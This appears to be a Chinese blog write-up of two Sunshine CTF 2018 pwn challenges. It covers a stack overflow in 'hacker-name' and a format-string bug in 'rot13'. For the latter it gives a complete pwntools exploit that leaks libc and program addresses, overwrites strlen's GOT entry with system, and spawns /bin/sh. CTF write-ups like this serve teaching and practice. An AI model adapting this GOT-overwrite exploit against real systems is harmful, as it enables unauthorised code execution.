---
layout:		post
title:		Sunshine CTF 2018部分writeup
author:		wooy0ung
tags:		pwn
category: 	writeup
---

- 目录
{:toc #markdown-toc}

>[索引目录]  
>0x001 hacker-name(stack overflow)  
>0x002 rot13(format string)  
<!-- more -->


## 0x001 hacker-name(stack overflow)

ida看到这
![](/assets/img/writeup/2018-04-09-sunshinectf-2018-writeup/0x001-001.png)
v1输入，但作比较的是s1

好在s1位于v1的下方，可以被覆盖掉
![](/assets/img/writeup/2018-04-09-sunshinectf-2018-writeup/0x001-002.png)

算一下偏移7
![](/assets/img/writeup/2018-04-09-sunshinectf-2018-writeup/0x001-003.png)


## 0x002 rot13(format string)

漏洞很明显，一个格式化串，但要绕过rot13
![](/assets/img/writeup/2018-04-09-sunshinectf-2018-writeup/0x002-001.png)

看下内存布局，proc_base: 0x5658c000、libc_base： 0xf7d80000
![](/assets/img/writeup/2018-04-09-sunshinectf-2018-writeup/0x002-002.png)

再看看函数栈，esp偏移3、4处分别能leak出libc_base、proc_base
![](/assets/img/writeup/2018-04-09-sunshinectf-2018-writeup/0x002-003.png)

exp.py
```
from pwn import *
from re import search
from string import maketrans, translate

context.log_level = "debug"

rot13_transe = maketrans('ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz', 'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm')

def rot13(arg):
  return translate(arg, rot13_transe)

s = process("./rot13")
#s = remote('chal1.sunshinectf.org', 20006)
elf = ELF("./rot13")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

s.sendlineafter("encrypted:",rot13("%2$x|%3$x"))

s.recvuntil("data: ")
text = s.recv()
text = search('(\w+)\|(\w+)', text)

libc_base = int(text.group(1), 16) - 0x25325
proc_base = int(text.group(2), 16) - 0x95b

system_addr = libc.symbols["system"] + libc_base
strlen_got = elf.got["strlen"] + proc_base

p = rot13(fmtstr_payload(7, {strlen_got:system_addr}))
s.sendline(p)

s.sendlineafter("encrypted:","/bin/sh")
s.interactive()
```